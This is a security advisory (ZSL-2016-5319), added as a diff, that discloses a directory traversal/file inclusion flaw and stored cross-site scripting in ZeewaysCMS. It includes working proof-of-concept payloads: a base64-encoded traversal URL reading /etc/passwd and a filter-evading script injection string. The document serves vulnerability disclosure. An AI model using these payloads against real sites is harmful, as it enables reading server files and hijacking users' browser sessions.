@@ -1,0 +1,54 @@
+
+ZeewaysCMS Multiple Vulnerabilities
+
+
+Vendor: Zeeways
+Product web page: http://www.zeewayscms.com
+Affected version: unknown
+
+Summary: ZeewaysCMS is a Content Management System and
+a complete Web & Mobile Solution developed by Zeeways
+for Corporates, Individuals or any kind of Business needs.
+
+Desc: ZeewaysCMS suffers from a file inclusion vulnerability
+(LFI) when encoded input passed thru the 'targeturl' GET parameter
+is not properly verified before being used to include files.
+This can be exploited to include files from local resources
+with directory traversal attacks. Multiple cross-site scripting
+vulnerabilities were also discovered. The issue is triggered
+when input passed via multiple parameters is not properly
+sanitized before being returned to the user. This can be
+exploited to execute arbitrary HTML and script code in a
+user's browser session in context of an affected site.
+
+Tested on: Apache/2.2.27
+           PHP/5.4.28
+
+
+Vulnerabilities discovered by Bikramaditya 'PhoenixX' Guha
+
+
+Advisory ID: ZSL-2016-5319
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5319.php
+
+
+25.03.2016
+
+--
+
+
+1. Directory Traversal:
+
+http://localhost/createPDF.php?targeturl=Ly4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2Q=&&pay_id=4&&type=actual
+Parameters: targeturl (GET)
+Base64 encoded payload: /../../../../../../../../etc/passwd
+
+2. Cross Site Scripting (Stored)
+
+http://localhost/profile
+Parameters: screen_name, f_name, l_name, uc_email, uc_mobile, user_contact_num (POST)
+
+Payload(s):
+Content-Disposition: form-data; name="screen_name"
+
+"><script><<imgIMG SRC=oi onerror=JaVaScript:alert(1)>
